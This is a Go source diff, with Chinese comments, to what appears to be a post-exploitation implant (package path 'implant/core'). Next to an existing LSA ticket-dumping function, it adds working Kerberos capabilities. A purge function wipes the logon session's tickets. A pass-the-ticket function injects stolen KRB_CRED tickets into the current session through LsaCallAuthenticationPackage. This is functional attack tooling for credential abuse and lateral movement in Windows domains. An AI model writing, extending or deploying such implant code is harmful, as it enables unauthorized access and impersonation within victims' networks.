@@ -17,6 +17,7 @@ import (
 	"errors"
 	"fmt"
 	"os"
+	"runtime"
 	"unsafe"
 
 	"implant/core/debuglog"
@@ -268,4 +269,65 @@ func credDumpLSATickets(fileName string) ([]byte, error) {
 		msg += fmt.Sprintf("；%d 项导出错误", len(errs))
 	}
 	return []byte(msg + "）"), nil
+}
+
+// lsaPurgeTicket 清除票据：server 为空表示清空当前登录会话的全部票据。
+//
+// 对应 `kerberos purge`。破坏性操作 —— 清完需要重新 kinit/重新认证。
+func lsaPurgeTicket(server string) error {
+	luid, err := currentLogonLUID()
+	if err != nil {
+		return err
+	}
+	req := kerbPurgeTktCacheRequest{
+		MessageType: kerbPurgeTicketCacheMessage,
+		LogonId:     luid,
+	}
+	if server != "" {
+		name, nerr := windows.UTF16FromString(server)
+		if nerr != nil {
+			return fmt.Errorf("服务名编码失败: %w", nerr)
+		}
+		req.ServerName = lsaUnicodeString{
+			Length:        uint16((len(name) - 1) * 2),
+			MaximumLength: uint16(len(name) * 2),
+			Buffer:        &name[0],
+		}
+		// name 必须在调用期间保持存活：req 持有其指针，GC 能追踪到
+		err = lsaCallAuthenticationPackage(unsafe.Pointer(&req), unsafe.Sizeof(req), nil)
+		runtime.KeepAlive(name)
+		return err
+	}
+	// 清空全部：ServerName/RealmName 都为空
+	return lsaCallAuthenticationPackage(unsafe.Pointer(&req), unsafe.Sizeof(req), nil)
+}
+
+// lsaSubmitTicket 提交票据（ptt）：把 KRB_CRED 字节追加在请求结构体之后。
+//
+// 对应 `kerberos ptt <base64>`。Key 全部清零（KRB_CRED 自带会话密钥，
+// 提交时不需要额外密钥）。
+func lsaSubmitTicket(krbCred []byte) error {
+	if len(krbCred) == 0 {
+		return errors.New("票据为空")
+	}
+	if len(krbCred) > 64<<10 {
+		return fmt.Errorf("票据过大: %d 字节", len(krbCred))
+	}
+	luid, err := currentLogonLUID()
+	if err != nil {
+		return err
+	}
+
+	structSize := int(unsafe.Sizeof(kerbSubmitTktRequest{}))
+	req := kerbSubmitTktRequest{
+		MessageType:    kerbSubmitTicketMessage,
+		LogonId:        luid,
+		KerbCredSize:   uint32(len(krbCred)),
+		KerbCredOffset: uint32(structSize), // 相对缓冲区起始；40 字节，8 字节对齐
+	}
+	buf := make([]byte, structSize+len(krbCred))
+	copy(buf, unsafe.Slice((*byte)(unsafe.Pointer(&req)), structSize))
+	copy(buf[structSize:], krbCred)
+
+	return lsaCallAuthenticationPackage(unsafe.Pointer(&buf[0]), uintptr(len(buf)), nil)
 }
